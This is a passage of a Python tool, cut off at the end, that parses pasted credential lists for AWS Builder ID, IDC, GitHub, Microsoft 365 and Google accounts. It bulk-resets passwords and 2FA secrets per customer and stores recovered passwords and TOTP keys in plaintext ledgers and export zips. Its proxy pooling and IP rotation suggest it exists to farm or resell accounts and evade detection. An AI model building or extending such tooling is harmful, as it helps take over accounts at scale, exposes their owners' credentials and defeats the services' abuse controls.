    email = (classified.get("email") or "").strip()
    password = classified.get("password") or ""
    mail_password = (classified.get("mail_password") or "").strip()
    if not password and mail_password:
        password = mail_password
    if not email or not password or email.lower() in _SKIP_IDENTITY:
        return None
    return AccountInput(
        idx=idx,
        email=email,
        password=password,
        proxy=classified.get("proxy") or "",
        mfa_secret=classified.get("mfa_secret") or "",
        start_url=classified.get("start_url") or "",
        region=classified.get("region") or "",
        mail_password=mail_password,
    )


def _split_dashed_line(line: str) -> Optional[list[str]]:
    """四横线是通用分隔符。三横线仅在账号段不含 :|,; 时启用，避免切开 email:password。"""
    if "----" in line:
        return [p.strip() for p in line.split("----") if p.strip() != ""]
    if "---" in line:
        head = line.split("---", 1)[0]
        if head.strip() and ":" not in head and not ACCOUNT_SEP_RE.search(head):
            return [p.strip() for p in line.split("---") if p.strip() != ""]
    return None


def _split_generic_account_line(line: str) -> list[str]:
    """拆分非横线单行：tab/,;|、空白、冒号。"""
    dashed = _split_dashed_line(line)
    if dashed is not None:
        return dashed
    if ACCOUNT_SEP_RE.search(line):
        parts = ACCOUNT_SEP_RE.split(line)
    elif re.search(r"\s+", line):
        parts = re.split(r"\s+", line, maxsplit=3)
    else:
        parts = line.split(":", 3)
    return [p.strip() for p in parts if p.strip() != ""]


_STANDARD_FIELD_RE = re.compile(
    r"^\s*(type|login|password|mail_password|mfa_secret|start_url|region|proxy)\s*"
    r"[:=]\s*(.*?)\s*$",
    re.IGNORECASE,
)


def _standard_provider(value: str) -> str:
    normalized = re.sub(r"[\s-]+", "_", (value or "").strip().lower())
    return {
        "aws": "student",
        "aws_student": "student",
        "student": "student",
        "builder_id": "student",
        "builderid": "student",
        "github": "github",
        "git_hub": "github",
        "idc": "idc",
        "aws_idc": "idc",
        "m365": "m365",
        "microsoft_365": "m365",
        "google": "google",
        "gmail": "google",
    }.get(normalized, normalized)


def _standard_provider_matches(provider: str, login_mode: str) -> bool:
    wanted = (login_mode or "").strip().lower()
    if wanted in STUDENT_LOGIN_MODES:
        wanted = "student"
    normalized = _standard_provider(provider)
    return not wanted or normalized == wanted


def _parse_standard_accounts(text: str, login_mode: str = "") -> list[AccountInput]:
    """Parse the canonical account block format.

    Each account uses the same field names regardless of provider:

      TYPE: STUDENT
      LOGIN: student@university.edu
      MAIL_PASSWORD: OutlookPassword
      PASSWORD: BuilderIdPassword
      MFA_SECRET: BASE32SECRET

    GitHub blocks omit MAIL_PASSWORD and use the GitHub login in LOGIN.
    """
    accounts: list[AccountInput] = []
    current: dict[str, str] = {}

    def flush() -> None:
        nonlocal current
        if not current:
            return
        provider = _standard_provider(current.get("type", ""))
        login = current.get("login", "").strip()
        password = current.get("password", "").strip()
        mail_password = current.get("mail_password", "").strip()
        if (
            login
            and password
            and _standard_provider_matches(provider, login_mode)
            and provider in {"student", "github", "idc", "m365", "google"}
        ):
            secret = current.get("mfa_secret", "").strip()
            accounts.append(AccountInput(
                idx=len(accounts) + 1,
                email=login,
                password=password,
                mail_password=mail_password,
                mfa_secret=_normalize_mfa_secret(secret) if secret else "",
                start_url=current.get("start_url", "").strip(),
                region=current.get("region", "").strip(),
                proxy=current.get("proxy", "").strip(),
            ))
        current = {}

    for raw in (text or "").splitlines():
        line = raw.strip()
        if not line:
            flush()
            continue
        if line.startswith("#"):
            continue
        match = _STANDARD_FIELD_RE.match(line)
        if not match:
            continue
        field = match.group(1).strip().lower()
        value = match.group(2).strip()
        if field in {"type", "login"} and current.get(field):
            flush()
        current[field] = value
    flush()
    return accounts


def _is_aws_portal_key(key: str) -> bool:
    return key in {"username", "one-time password", "password"} or key.startswith(
        "default aws access portal url"
    ) or key.startswith("dual-stack aws access portal url")


def _aws_portal_key_name(line: str) -> str:
    match = AWS_BLOCK_FIELD_RE.match((line or "").strip())
    if not match:
        return ""
    return re.sub(r"\s+", " ", match.group(1).strip().lower())


def _partition_standard_blocks(text: str) -> tuple[str, str]:
    """把 TYPE: 开头的标准块从混贴文本里剥出来，剩下的仍走旧解析。

    标准块（学生号 TYPE / LOGIN / MAIL_PASSWORD / PASSWORD）与
    ``email|pass|pass`` / ``----`` / MAIL 标签互不抢行：
    只有已经进入 TYPE: 块之后的标准字段行才从旧解析里拿走。
    单独的 LOGIN: / PASSWORD:（没有 TYPE:）仍留给标签解析。
    """
    standard_lines: list[str] = []
    remainder_lines: list[str] = []
    in_block = False
    for raw in (text or "").splitlines():
        stripped = raw.strip()
        if not stripped:
            if in_block:
                standard_lines.append("")
            remainder_lines.append("")
            in_block = False
            continue
        if stripped.startswith("#"):
            (standard_lines if in_block else remainder_lines).append(raw)
            continue
        match = _STANDARD_FIELD_RE.match(stripped)
        if match:
            field = match.group(1).strip().lower()
            if field == "type":
                in_block = True
            if in_block:
                standard_lines.append(raw)
                continue
        in_block = False
        remainder_lines.append(raw)
    return "\n".join(standard_lines), "\n".join(remainder_lines)


def _reindex_accounts(accounts: list[AccountInput]) -> list[AccountInput]:
    for i, acc in enumerate(accounts, start=1):
        acc.idx = i
    return accounts


def _paragraph_is_aws_portal(lines: list[str], idx: int) -> bool:
    """当前空行段落里是否出现 AWS access portal 的强标记，避免 Username: 误吃 username: x password: y。"""
    start = idx
    while start > 0 and str(lines[start - 1]).strip():
        start -= 1
    end = idx
    while end + 1 < len(lines) and str(lines[end + 1]).strip():
        end += 1
    for j in range(start, end + 1):
        key = _aws_portal_key_name(str(lines[j]))
        if key == "one-time password" or key.startswith("default aws access portal url") or key.startswith("dual-stack aws access portal url"):
            return True
    return False


def parse_accounts(text: str, mode: str = "auto", login_mode: str = "") -> list[AccountInput]:
    """解析账号输入。多种格式可混在同一段文本里，按行识别、互不抢行。

    分隔符：四横线 ``----``（通用字段分隔，不固定 mail/password/2fa）、
    三横线 ``---``、空格/tab/逗号/分号/竖线/冒号。
    字段按内容识别 Start URL / region / 代理 / TOTP 密钥，其余按顺序取账号和密码。
    学生号标签：MAIL / PASS MAIL / PASS AWS / 2FA（可选）；无标签为 邮箱、Outlook 密码、AWS 密码、2FA（可选）。
    学生号 TYPE 块（TYPE / LOGIN / MAIL_PASSWORD / PASSWORD）只从带 ``TYPE:`` 的块里取，
    不会盖掉同一段文本里的 ``|`` / ``----`` 行。
    accountMode=student 时按学生号字段顺序解析。
    """
    mode_norm = (mode or "auto").strip().lower()
    login_mode_norm = (login_mode or "").strip().lower()
    student_order = login_mode_norm in STUDENT_LOGIN_MODES or mode_norm == "student"
    if login_mode_norm in STUDENT_LOGIN_MODES:
        login_mode_norm = "student"
    standard_text, remainder_text = _partition_standard_blocks(text or "")
    prepended = (
        _parse_standard_accounts(standard_text, login_mode_norm)
        if standard_text.strip()
        else []
    )
    if mode_norm == "fixed":
        return _reindex_accounts(prepended + _parse_fixed_columns(remainder_text, student_order=student_order))

    text = remainder_text
    accounts: list[AccountInput] = []
    pending: Optional[AccountInput] = None
    labeled_cur: dict[str, str] = {}
    last_labeled_start = ""
    last_labeled_region = ""
    saw_labeled_start = False
    current_provider = ""
    aws_fields: dict[str, str] = {}
    header_url = ""
    header_region = ""

    def take_account(acc: Optional[AccountInput], *, inherit_header: bool = False) -> None:
        nonlocal pending
        if acc is None:
            return
        if not acc.email or not acc.password or acc.email.lower() in _SKIP_IDENTITY:
            return
        if inherit_header:
            if not acc.start_url and header_url:
                acc.start_url = header_url
            if not acc.region and header_region:
                acc.region = header_region
        acc.idx = len(accounts) + 1
        accounts.append(acc)
        pending = acc

    def flush_labeled() -> None:
        nonlocal labeled_cur, last_labeled_start, last_labeled_region, pending
        if not labeled_cur:
            return
        block_provider = labeled_cur.get("_provider", current_provider)
        email = _normalize_labeled_value("email", labeled_cur.get("email", "").strip(), login_mode_norm, block_provider)
        password = _normalize_labeled_value("password", labeled_cur.get("password", "").strip(), login_mode_norm, block_provider)
        su = labeled_cur.get("start_url", "").strip() or last_labeled_start
        rg = labeled_cur.get("region", "").strip() or last_labeled_region
        if su:
            last_labeled_start = su
        if rg:
            last_labeled_region = rg
        mail_password = _normalize_labeled_value("mail_password", labeled_cur.get("mail_password", "").strip(), login_mode_norm, block_provider)
        if not password and mail_password:
            password = mail_password
        provider_ok = _provider_matches_login(block_provider, login_mode_norm)
        if email and password and provider_ok and (saw_labeled_start or mail_password or student_order or login_mode_norm in {"github", "google", "m365"}):
            mfa = labeled_cur.get("mfa_secret", "").strip()
            if mfa and _looks_like_mfa_secret(mfa):
                mfa = _normalize_labeled_value("mfa_secret", mfa, login_mode_norm, block_provider)
            take_account(AccountInput(
                idx=len(accounts) + 1,
                email=email,
                password=password,
                start_url=su,
                region=rg,
                mfa_secret=mfa,
                mail_password=mail_password,
            ))
        labeled_cur = {}

    def flush_aws() -> None:
        nonlocal aws_fields, pending
        username = aws_fields.get("username", "").strip()
        password = aws_fields.get("one-time password", "").strip() or aws_fields.get("password", "").strip()
        if username and password:
            take_account(AccountInput(idx=len(accounts) + 1, email=username, password=password))
        aws_fields = {}

    def switch_format() -> None:
        flush_labeled()
        flush_aws()

    raw_lines = (text or "").splitlines()
    for idx, raw in enumerate(raw_lines):
        line = raw.strip()
        if not line:
            switch_format()
            continue
        if line.startswith("#"):
            continue
        if re.fullmatch(r"email\s*\|\s*emailpass\s*\|\s*awspass\s*\|\s*mfa", line, re.IGNORECASE):
            continue
        line = re.split(r"\s{2,}#", line, maxsplit=1)[0].rstrip()
        if not line:
            continue

        provider_heading = _detect_provider_heading(line)
        if provider_heading:
            switch_format()
            current_provider = provider_heading
            pending = None
            continue

        inline_user_pass = INLINE_USER_PASS_RE.match(line)
        if inline_user_pass:
            switch_format()
            take_account(AccountInput(
                idx=len(accounts) + 1,
                email=inline_user_pass.group(1).strip(),
                password=inline_user_pass.group(2).strip(),
            ))
            continue

        aws_match = AWS_BLOCK_FIELD_RE.match(line)
        if aws_match:
            key = re.sub(r"\s+", " ", aws_match.group(1).strip().lower())
            value = aws_match.group(2).strip()
            distinctive_aws = (
                key.startswith("default aws access portal url")
                or key.startswith("dual-stack aws access portal url")
                or key == "one-time password"
            )
            if _is_aws_portal_key(key) and (distinctive_aws or aws_fields or _paragraph_is_aws_portal(raw_lines, idx)):
                if key.startswith("default aws access portal url") and aws_fields.get("username") and aws_fields.get("one-time password"):
                    flush_aws()
                aws_fields[key] = value
                pending = None
                continue

        login_match = LOGIN_ONETIME_RE.match(line)
        if login_match:
            switch_format()
            email = login_match.group(1).strip()
            password = login_match.group(2).strip()
            take_account(AccountInput(idx=len(accounts) + 1, email=email, password=password))
            continue

        slash_match = SIMPLE_SLASH_RE.match(line)
        if slash_match and not BLOCK_2FA_RE.match(line):
            email = slash_match.group(1).strip()
            password = slash_match.group(2).strip()
            if email and password and email.lower() != "login":
                switch_format()
                take_account(AccountInput(idx=len(accounts) + 1, email=email, password=password))
                continue

        twofa_match = BLOCK_2FA_RE.match(line)
        if twofa_match:
            candidate = twofa_match.group(1).strip()
            if _looks_like_mfa_secret(candidate):
                secret = _normalize_mfa_secret(candidate)
                if pending is not None and not pending.mfa_secret:
                    pending.mfa_secret = secret
                    continue
                if labeled_cur and not labeled_cur.get("mfa_secret"):
                    labeled_cur["mfa_secret"] = secret
                    continue
        if pending is not None and not pending.mfa_secret and _looks_like_mfa_secret(line):
            pending.mfa_secret = _normalize_mfa_secret(line)
            continue

        labeled_match = _LABELED_LINE_RE.match(line)
        if labeled_match and len(list(_INLINE_LABEL_RE.finditer(line))) < 2:
            field_name = _resolve_labeled_field(labeled_match.group(1))
            value = labeled_match.group(2).strip()
            if field_name and value and (
                field_name in ("start_url", "email", "password", "mail_password", "region", "mfa_secret")
                or labeled_cur
                or last_labeled_start
            ):
                flush_aws()
                if field_name == "start_url":
                    saw_labeled_start = True
                if field_name in ("email", "password", "mail_password") and labeled_cur.get(field_name):
                    flush_labeled()
                if current_provider and not labeled_cur.get("_provider"):
                    labeled_cur["_provider"] = current_provider
                labeled_cur[field_name] = value
                pending = None
                continue

        inline_acc = _parse_inline_labeled_line(
            line, len(accounts) + 1, last_labeled_start, last_labeled_region,
            login_mode_norm, current_provider
        )
        if inline_acc and _provider_matches_login(current_provider, login_mode_norm) and (
            inline_acc.start_url or inline_acc.mail_password or student_order or login_mode_norm in {"github", "google", "m365"}
        ):
            switch_format()
            if inline_acc.start_url:
                last_labeled_start = inline_acc.start_url
                saw_labeled_start = True
            if inline_acc.region:
                last_labeled_region = inline_acc.region
            take_account(inline_acc)
            continue

        if "|" not in line and "----" not in line and looks_like_idc_start_url(line):
            switch_format()
            header_url = line
            header_region = ""
            pending = None
            continue
        if (
            header_url
            and not header_region
            and "|" not in line
            and "----" not in line
            and _REGION_TOKEN_RE.match(line.lower())
        ):
            header_region = line
            pending = None
            continue

        if "|" in line:
            first = line.split("|", 1)[0].strip()
            if looks_like_idc_start_url(first):
                switch_format()
                pipe_accs = _parse_pipe_starturl_blocks(line)
                for acc in pipe_accs:
                    take_account(acc)
                continue
            if header_url:
                switch_format()
                email, _, password = line.partition("|")
                take_account(AccountInput(
                    idx=len(accounts) + 1,
                    email=email.strip(),
                    password=password.strip(),
                    start_url=header_url,
                    region=header_region,
                ), inherit_header=False)
                continue

        dashed_parts = _split_dashed_line(line)
        if dashed_parts is not None:
            switch_format()
            take_account(_account_from_classified(len(accounts) + 1, _classify_account_parts(dashed_parts, student_order=student_order)))
            continue

        switch_format()
        parts = _split_generic_account_line(line)
        take_account(_account_from_classified(len(accounts) + 1, _classify_account_parts(parts, student_order=student_order)))

    switch_format()
    if prepended:
        return _reindex_accounts(prepended + accounts)
    return accounts


def load_known_mfa_secrets(customer_id: str) -> dict[str, str]:
    """Return MFA secrets that are safe to reuse for login.

    Early MFA files are write-ahead artifacts: they preserve a captured setup
    key even if later verification or cleanup fails.  They are useful for
    recovery, but they are not proof that the account now accepts that TOTP
    secret.  Automatic enrichment therefore trusts job results only when the
    result confirms the secret was bound, or a successful login result carried
    the secret.
    """
    found: dict[str, tuple[float, str]] = {}

    def consider(email: str, secret: str, ts: float) -> None:
        email = str(email or "").strip()
        secret = _normalize_mfa_secret(secret)
        if not email or not _looks_like_mfa_secret(secret):
            return
        prev = found.get(email)
        if prev is None or ts >= prev[0]:
            found[email] = (ts, secret)

    with JOBS_LOCK:
        jobs = list(JOBS.values())
    for job in jobs:
        ts = float(job.finished_at or job.created_at or 0)
        for result in job.results:
            secret = str(result.mfa_secret or "").strip()
            if not secret:
                continue
            if result.changed_mfa or result.ok:
                consider(result.email, secret, ts)
    return {email: secret for email, (_ts, secret) in found.items()}


def enrich_accounts_with_known_mfa(accounts: list[AccountInput], customer_id: str) -> int:
    known = load_known_mfa_secrets(customer_id)
    if not known:
        return 0
    updated = 0
    for acc in accounts:
        saved = known.get(acc.email, "")
        if saved and saved != acc.mfa_secret:
            acc.mfa_secret = saved
            updated += 1
    return updated


def load_original_student_credentials(customer_id: str) -> dict[str, dict[str, str]]:
    """Load canonical student credentials from original raw export files.

    Expected row format:
      email|email pass|aws pass|mfa

    MFA may be empty. Newer files win if the same email appears more than once.
    """
    if not customer_id:
        return {}
    base = Path(__file__).parent / "exports" / customer_id
    if not base.exists():
        return {}
    paths = sorted(
        base.glob("batch-*-original-raw-credentials.txt"),
        key=lambda path: path.stat().st_mtime,
    )
    known: dict[str, dict[str, str]] = {}
    for path in paths:
        try:
            lines = path.read_text(encoding="utf-8", errors="replace").splitlines()
        except Exception:
            continue
        for raw in lines:
            line = raw.strip()
            if not line or line.startswith("#") or "|" not in line:
                continue
            parts = [part.strip() for part in line.split("|")]
            if len(parts) < 3:
                continue
            email = parts[0]
            if not email or email.lower() in {"email", "username", "user", "account", "账号"}:
                continue
            mail_password = parts[1]
            aws_password = parts[2]
            mfa_secret = ""
            if len(parts) >= 4 and _looks_like_mfa_secret(parts[3]):
                mfa_secret = _normalize_mfa_secret(parts[3])
            if mail_password or aws_password or mfa_secret:
                known[email] = {
                    "mail_password": mail_password,
                    "password": aws_password,
                    "mfa_secret": mfa_secret,
                }
    return known


def repair_student_credentials_from_original(accounts: list[AccountInput], customer_id: str) -> dict[str, int]:
    """Fix student mail/AWS password order from the saved original raw file."""
    known = load_original_student_credentials(customer_id)
    stats = {"reference": len(known), "swapped": 0, "filled_mail": 0, "filled_mfa": 0}
    if not known:
        return stats
    for acc in accounts:
        ref = known.get(acc.email)
        if not ref:
            continue
        ref_mail = ref.get("mail_password", "")
        ref_aws = ref.get("password", "")
        ref_mfa = ref.get("mfa_secret", "")
        cur_mail = (acc.mail_password or "").strip()
        cur_aws = (acc.password or "").strip()

        # Exact reversed 3-column input: email|aws pass|email pass|mfa
        if ref_mail and ref_aws and cur_mail == ref_aws and cur_aws == ref_mail:
            acc.mail_password = ref_mail
            acc.password = ref_aws
            stats["swapped"] += 1
        else:
            if ref_mail and not cur_mail:
                acc.mail_password = ref_mail
                stats["filled_mail"] += 1
            elif ref_mail and ref_aws and cur_mail == ref_aws:
                acc.mail_password = ref_mail
                stats["swapped"] += 1

            # Two-column input often puts the Outlook password in the password field.
            # If it matches the original mail password, replace the AWS password with
            # the original AWS password and keep the mail password for Outlook OTP.
            if ref_aws and cur_aws == ref_mail:
                acc.password = ref_aws
                if ref_mail and not acc.mail_password:
                    acc.mail_password = ref_mail
                stats["swapped"] += 1
            elif ref_aws and not cur_aws:
                acc.password = ref_aws

        if ref_mfa and not acc.mfa_secret:
            acc.mfa_secret = ref_mfa
            stats["filled_mfa"] += 1
    return stats


def _ledger_item_applied(item: dict[str, Any] | None) -> bool:
    if not item:
        return False
    if item.get("applied"):
        return True
    return str(item.get("status") or "") in {"applied", "success", "failed_after_apply"}


def load_known_applied_passwords(customer_id: str) -> dict[str, str]:
    """Latest site-accepted password per email, from ledgers and job results."""
    found: dict[str, tuple[float, str]] = {}

    def consider(email: str, pwd: str, ts: float) -> None:
        email = str(email or "").strip()
        pwd = str(pwd or "").strip()
        if not email or not pwd:
            return
        prev = found.get(email)
        if prev is None or ts >= prev[0]:
            found[email] = (ts, pwd)

    exports_root = Path(__file__).parent / "exports"
    search_dirs: list[Path] = []
    if customer_id:
        search_dirs.append(exports_root / customer_id)
    if exports_root.exists():
        search_dirs.extend(sorted(path for path in exports_root.iterdir() if path.is_dir()))
    seen_dirs: set[Path] = set()
    for base in search_dirs:
        if base in seen_dirs or not base.exists():
            continue
        seen_dirs.add(base)
        for path in base.glob("kiro-password-ledger-*.json"):
            try:
                mtime = path.stat().st_mtime
                data = json.loads(path.read_text(encoding="utf-8"))
            except Exception:
                continue
            if not isinstance(data, dict):
                continue
            for item in data.get("accounts") or []:
                if not isinstance(item, dict) or not _ledger_item_applied(item):
                    continue
                ts = mtime
                updated = str(item.get("updatedAt") or "")
                if updated:
                    try:
                        ts = dt.datetime.fromisoformat(updated.replace("Z", "+00:00")).timestamp()
                    except Exception:
                        pass
                consider(item.get("email", ""), item.get("newPassword", ""), ts)

    with JOBS_LOCK:
        jobs = list(JOBS.values())
    for job in jobs:
        ts = float(job.finished_at or job.created_at or 0)
        for result in job.results:
            if result.changed_password and result.final_password:
                consider(result.email, result.final_password, ts)
    return {email: pwd for email, (_ts, pwd) in found.items()}


def enrich_accounts_with_known_passwords(accounts: list[AccountInput], customer_id: str) -> int:
    known = load_known_applied_passwords(customer_id)
    if not known:
        return 0
    updated = 0
    for acc in accounts:
        saved = known.get(acc.email, "")
        if saved and saved != acc.password:
            acc.password = saved
            updated += 1
    return updated


def latest_usable_login_password(job: "Job", account: AccountInput, result: Optional["AccountResult"]) -> str:
    """Password that can actually log in. Ignores write-ahead passwords that were never applied."""
    if result and result.changed_password and str(result.final_password or "").strip():
        return str(result.final_password).strip()
    try:
        item = _ledger_item_for_email(read_password_ledger(job), account.email)
    except Exception:
        item = None
    if _ledger_item_applied(item):
        pwd = str((item or {}).get("newPassword") or "").strip()
        if pwd:
            return pwd
    saved = load_known_applied_passwords(job.customer_id).get(account.email, "")
    if saved:
        return saved
    return account.password


def recovered_account_input_line(row: dict[str, Any]) -> str:
    """Build an input line that the existing account parser can consume directly."""
    login_mode = str(row.get("loginMode") or "idc").strip().lower()
    email = str(row.get("email") or "").strip()
    password = str(row.get("password") or "")
    mfa_secret = str(row.get("mfaSecret") or "").strip()
    proxy = str(row.get("proxy") or "").strip()
    if login_mode in STUDENT_LOGIN_MODES:
        # Student mode uses the explicit MAIL/PASS MAIL/PASS AWS order.
        parts = [
            email,
            str(row.get("mailPassword") or password),
            password,
        ]
        if mfa_secret:
            parts.append(mfa_secret)
        if proxy:
            parts.append(proxy)
        return "|".join(parts)

    start_url = str(row.get("startUrl") or "").strip()
    region = str(row.get("region") or "").strip()
    parts: list[str] = []
    if start_url:
        parts.append(f"idc::{start_url}")
        if region:
            parts.append(region)
    parts.extend((email, password))
    if mfa_secret:
        parts.append(mfa_secret)
    if proxy:
        parts.append(proxy)
    return "----".join(parts)


def failed_account_credentials(job: Job) -> list[dict[str, Any]]:
    """Return failed/uncompleted accounts with the latest usable credentials."""
    with JOBS_LOCK:
        accounts = list(job.accounts)
        results = list(job.results)
        options = dict(job.options or {})

    result_by_key = {(result.idx, result.email): result for result in results}
    successful_keys = {(result.idx, result.email) for result in results if result.ok}
    login_mode = str(options.get("login_mode") or "idc").strip().lower()
    if login_mode in STUDENT_LOGIN_MODES:
        login_mode = "student"
    rows: list[dict[str, Any]] = []

    for account in accounts:
        key = (account.idx, account.email)
        if key in successful_keys:
            continue
        result = result_by_key.get(key)
        saved_password = latest_usable_login_password(job, account, result)
        final_password = saved_password or account.password
        saved_mfa_secret = find_customer_saved_secret(
            job.customer_id,
            account.email,
            ("kiro-mfa-secrets-*.txt", "kiro-mfa-secrets-early-*.txt"),
        )
        mfa_secret = (
            (result.mfa_secret if result else "")
            or saved_mfa_secret
            or account.mfa_secret
        )
        row: dict[str, Any] = {
            "idx": account.idx,
            "email": account.email,
            "password": final_password,
            "mailPassword": account.outlook_password() if login_mode in STUDENT_LOGIN_MODES else "",
            "mfaSecret": mfa_secret,
            "proxy": account.proxy,
            "startUrl": account.start_url or str(options.get("start_url") or ""),
            "region": account.region,
            "oidcRegion": str(options.get("oidc_region") or ""),
            "kiroRegion": str(options.get("kiro_region") or ""),
            "loginMode": login_mode,
            "changedPassword": bool(result.changed_password if result else False),
            "message": (
                result.message
                if result and result.message
                else ("任务中断或排队时未执行" if not result else "失败")
            ),
        }
        row["input"] = recovered_account_input_line(row)
        rows.append(row)
    return rows


def safe_export_filename(value: str, fallback: str) -> str:
    name = re.sub(r"[^A-Za-z0-9._+-]+", "_", (value or "").strip()).strip("._")
    return (name or fallback)[:80]


def random_account_password() -> str:
    # AWS IDC 密码策略要求大写+小写+数字+符号四类齐全。
    # 前缀 "Kiro@" 已含大写/小写/符号，末尾 "#" 为符号，但中间 core 必须保证至少一个数字，
    # 否则纯随机可能抽到全字母（无数字）导致 Invalid password。
    lower = "abcdefghijkmnopqrstuvwxyz"
    upper = "ABCDEFGHJKLMNPQRSTUVWXYZ"
    digits = "23456789"
    alphabet = upper + lower + digits
    core_chars = [
        secrets.choice(lower),
        secrets.choice(upper),
        secrets.choice(digits),
    ]
    core_chars.extend(secrets.choice(alphabet) for _ in range(15))
    secrets.SystemRandom().shuffle(core_chars)
    core = "".join(core_chars)
    return f"Kiro@{core}#"


# 全角/中文标点 → 半角 ASCII 标点映射。
# 场景：用户在中文输入法下复制密码，符号可能被输成全角（＠！＃）等），
# 与 AWS 实际密码不一致导致登录/改密失败。这里只转换标点与空格，不动字母/汉字。
_FULLWIDTH_SYMBOL_MAP = {
    "！": "!", "＂": '"', "＃": "#", "＄": "$", "％": "%", "＆": "&",
    "＇": "'", "（": "(", "）": ")", "＊": "*", "＋": "+", "，": ",",
    "－": "-", "．": ".", "／": "/", "：": ":", "；": ";", "＜": "<",
    "＝": "=", "＞": ">", "？": "?", "＠": "@", "［": "[", "＼": "\\",
    "］": "]", "＾": "^", "＿": "_", "｀": "`", "｛": "{", "｜": "|",
    "｝": "}", "～": "~",
    # 常见中文标点
    "。": ".", "，": ",", "、": ",", "；": ";", "：": ":",
    "“": '"', "”": '"', "‘": "'", "’": "'",
    "（": "(", "）": ")", "【": "[", "】": "]", "《": "<", "》": ">",
    "！": "!", "？": "?", "～": "~", "·": ".", "—": "-", "－": "-",
    "　": " ",
}


def normalize_fullwidth_symbols(text: str) -> tuple[str, int]:
    """将字符串中的全角/中文标点转为半角 ASCII。返回 (转换后文本, 改动字符数)。

    优先查显式映射表；未命中但落在全角 ASCII 区（U+FF01..U+FF5E）的字符
    按 − 0xFEE0 转为对应半角。只动能明确映射的字符，其余原样保留。
    """
    if not text:
        return text, 0
    out: list[str] = []
    changed = 0
    for ch in text:
        repl = _FULLWIDTH_SYMBOL_MAP.get(ch)
        if repl is None:
            code = ord(ch)
            if 0xFF01 <= code <= 0xFF5E:
                repl = chr(code - 0xFEE0)
        if repl is not None and repl != ch:
            out.append(repl)
            changed += 1
        else:
            out.append(ch)
    return "".join(out), changed


def normalize_accounts_symbols(accounts: list["AccountInput"]) -> int:
    """对账号列表的密码全角标点做半角归一化，返回发生转换的账号数。

    只动密码（用户原始密码）；email/代理/MFA 不动，避免误伤。
    """
    affected = 0
    for acc in accounts:
        new_pwd, changed = normalize_fullwidth_symbols(acc.password)
        if changed:
            acc.password = new_pwd
            affected += 1
        if acc.mail_password:
            new_mail, mail_changed = normalize_fullwidth_symbols(acc.mail_password)
            if mail_changed:
                acc.mail_password = new_mail
                affected += 1
    return affected


def stronger_account_password() -> str:
    """Generate a conservative AWS IDC-compatible password for policy retry."""
    lower = "abcdefghijkmnopqrstuvwxyz"
    upper = "ABCDEFGHJKLMNPQRSTUVWXYZ"
    digits = "23456789"
    symbols = "!@#$%^&*()-_=+"
    pool = lower + upper + digits + symbols
    chars = [
        secrets.choice(lower),
        secrets.choice(upper),
        secrets.choice(digits),
        secrets.choice(symbols),
    ]
    chars.extend(secrets.choice(pool) for _ in range(24))
    secrets.SystemRandom().shuffle(chars)
    return "Kiro" + "".join(chars)


def parse_payload_bool(payload: dict[str, Any], key: str, default: bool) -> bool:
    if key not in payload or payload.get(key) is None:
        return default
    value = payload.get(key)
    if isinstance(value, str):
        return value.strip().lower() not in {"", "0", "false", "no", "off"}
    return bool(value)


def change_actions_label(options: dict[str, Any]) -> str:
    parts: list[str] = []
    if options.get("clean_mfa_only"):
        return "仅清理旧2FA"
    if options.get("do_change_password", True):
        parts.append("修改密码")
    if options.get("do_change_mfa"):
        parts.append("设置/更换2FA")
    elif options.get("do_remove_old_mfa"):
        parts.append("删除旧2FA")
    return "+".join(parts) or "未选择"


def fallback_new_password(current: str) -> str:
    """Password used only if AWS forces a first-login change during a 2FA-only job."""
    candidate = DEFAULT_NEW_PASSWORD
    if candidate == (current or ""):
        candidate = DEFAULT_NEW_PASSWORD + "9"
    return candidate


def clamp_int(value: Any, default: int, low: int, high: int) -> int:
    try:
        parsed = int(value)
    except Exception:
        parsed = default
    return max(low, min(parsed, high))


def looks_like_password_policy_error(message: str) -> bool:
    msg = (message or "").lower()
    markers = (
        "首次登录改密码失败",
        "invalid password",
        "password policy",
        "does not meet",
        "doesn't meet",
        "must contain",
        "too similar",
        "previously used",
        "too common",
        "too weak",
        "too short",
        "密码策略",
        "密码不符合",
        "新密码不符合",
    )
    return any(marker.lower() in msg for marker in markers)


def build_split_export_zip(export_path: str, zip_path: str, accounts_per_file: int = 1) -> int:
    exported = json.loads(Path(export_path).read_text(encoding="utf-8"))
    if not isinstance(exported, list):
        raise ValueError("导出 JSON 格式不是列表")
    accounts_per_file = max(1, min(int(accounts_per_file or 1), 1000))
    grouped: dict[str, list[dict[str, Any]]] = {}
    for idx, item in enumerate(exported, start=1):
        if not isinstance(item, dict):
            continue
        key = str(item.get("email") or item.get("account") or item.get("username") or f"account-{idx}")
        grouped.setdefault(key, []).append(item)
    groups = list(grouped.items())
    with zipfile.ZipFile(zip_path, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        for index in range(0, len(groups), accounts_per_file):
            chunk = groups[index:index + accounts_per_file]
            if not chunk:
                continue
            file_no = index // accounts_per_file + 1
            if accounts_per_file == 1:
                email, items = chunk[0]
                filename = f"{file_no:03d}-{safe_export_filename(email, f'account-{file_no}')}.json"
                payload = items
            else:
                start_no = index + 1
                end_no = index + len(chunk)
                first_email = chunk[0][0]
                filename = f"{file_no:03d}-accounts-{start_no:03d}-{end_no:03d}-{safe_export_filename(first_email, f'account-{start_no}')}.json"
                payload = [item for _email, items in chunk for item in items]
            zf.writestr(filename, json.dumps(payload, ensure_ascii=False, indent=2))
    Path(zip_path).chmod(0o600)
    return (len(groups) + accounts_per_file - 1) // accounts_per_file if groups else 0


def sanitize_proxy(proxy: str, allow_loopback: bool = False) -> str:
    """规范化用户填写的代理。支持 URL、裸 host:port、ip:port:user:pass。"""
    normalized = normalize_proxy_url(proxy)
    if not normalized:
        return ""
    parsed = parse_proxy(normalized)
    if not parsed:
        return ""
    host = str(parsed["host"]).strip("[]").lower()
    if not allow_loopback and any(host == blocked or host.startswith(blocked) for blocked in BLOCKED_PROXY_HOSTS):
        return ""
    return normalized


def sanitized_default_proxy() -> str:
    """服务端默认代理（env KIRO_DEFAULT_PROXY），允许本机回环。无效返回空。"""
    return sanitize_proxy(DEFAULT_PROXY, allow_loopback=True)


def apply_default_proxy(accounts: list["AccountInput"]) -> tuple[str, int]:
    """把服务端默认代理套给所有「未单独指定代理」的账号。
    返回 (代理字符串, 套了多少个)。应在 apply_proxy_pool 之后调用作为兑底。"""
    dp = sanitized_default_proxy()
    if not dp:
        return "", 0
    n = 0
    for acc in accounts:
        if not acc.proxy:
            acc.proxy = dp
            n += 1
    return dp, n


def mihomo_listen_proxy() -> str:
    """Local mixed-port used when mihomo is configured for IP rotation."""
    for candidate in (
